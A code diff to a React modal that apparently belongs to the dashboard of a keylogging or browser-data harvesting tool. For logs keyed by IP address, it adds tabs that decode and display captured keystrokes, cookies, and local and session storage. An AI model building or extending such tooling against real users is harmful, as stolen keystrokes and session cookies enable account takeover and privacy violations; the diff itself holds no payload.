@@ -7,15 +7,22 @@ import {
   Checkbox,
   Code,
   FormControl,
+  Heading,
   Modal,
   ModalBody,
   ModalContent,
   ModalFooter,
   ModalHeader,
   ModalOverlay,
+  Tab,
+  Tabs,
+  TabList,
+  TabPanel,
+  TabPanels,
   Text,
   Tooltip,
 } from "@chakra-ui/react";
+import moment from "moment-timezone";
 
 const BACKSPACE = "Backspace";
 const ENTER = "Enter";
@@ -69,19 +76,61 @@ const LogModal = ({ selectedLog, setShowDetails, showDetails }) => {
     >
       <ModalOverlay />
       <ModalContent height="500px">
-        <ModalHeader>Keystrokes for {selectedLog.ip}</ModalHeader>
+        <ModalHeader>{selectedLog.ip} - {moment(selectedLog.created_at).format("MMM DD, YYYY hh:mm a")}</ModalHeader>
         <ModalBody overflowY="scroll">
-          <FormControl mb="5">
-            <Checkbox onChange={toggleProcessKeys}>Process keystrokes</Checkbox>
-            <Tooltip label={PROCESS_KEYS_INFO}>
-              <InfoIcon ml="2" />
-            </Tooltip>
-          </FormControl>
-          <Box borderRadius="md" bg="gray.200" p="10px">
-            <Text mb="1rem" style={{ whiteSpace: "pre-line" }}>
-              {processedKeys}
-            </Text>
-          </Box>
+          <Tabs variant='soft-rounded' colorScheme='green'>
+            <TabList>
+              <Tab>Keystrokes</Tab>
+              {selectedLog.cookies && (<Tab>Cookies</Tab>)}
+              {(selectedLog.local_storage || selectedLog.session_storage) && (<Tab>Storage</Tab>)}
+            </TabList>
+            <TabPanels>
+              <TabPanel>
+                <FormControl mb="5">
+                  <Checkbox onChange={toggleProcessKeys}>Process keystrokes</Checkbox>
+                  <Tooltip label={PROCESS_KEYS_INFO}>
+                    <InfoIcon ml="2" />
+                  </Tooltip>
+                </FormControl>
+                <Box borderRadius="md" bg="gray.200" p="10px">
+                  <Text mb="1rem" style={{ whiteSpace: "pre-line" }}>
+                    {processedKeys}
+                  </Text>
+                </Box>
+              </TabPanel>
+              {selectedLog.cookies && (<TabPanel>
+                <Box borderRadius="md" bg="gray.200" p="10px">
+                  <Text mb="1rem" style={{ whiteSpace: "pre-line" }}>
+                    {atob(selectedLog.cookies)}
+                  </Text>
+                </Box>
+              </TabPanel>)}
+              {(selectedLog.local_storage || selectedLog.session_storage) && (
+                <TabPanel>
+                  {selectedLog.local_storage && (
+                    <>
+                      <Heading as='h4' size='md'>Local Storage</Heading>
+                      <Box borderRadius="md" bg="gray.200" p="10px">
+                        <Text mb="1rem" style={{ whiteSpace: "pre-line" }}>
+                          {atob(selectedLog.local_storage)}
+                        </Text>
+                      </Box>
+                    </>
+                  )}
+                  {selectedLog.session_storage && (
+                    <>
+                      <Heading as='h4' size='md'>Session Storage</Heading>
+                      <Box borderRadius="md" bg="gray.200" p="10px">
+                        <Text mb="1rem" style={{ whiteSpace: "pre-line" }}>
+                          {atob(selectedLog.session_storage)}
+                        </Text>
+                      </Box>
+                    </>
+                  )}
+                </TabPanel>
+              )}
+            </TabPanels>
+          </Tabs>
         </ModalBody>
         <ModalFooter>
           <Button
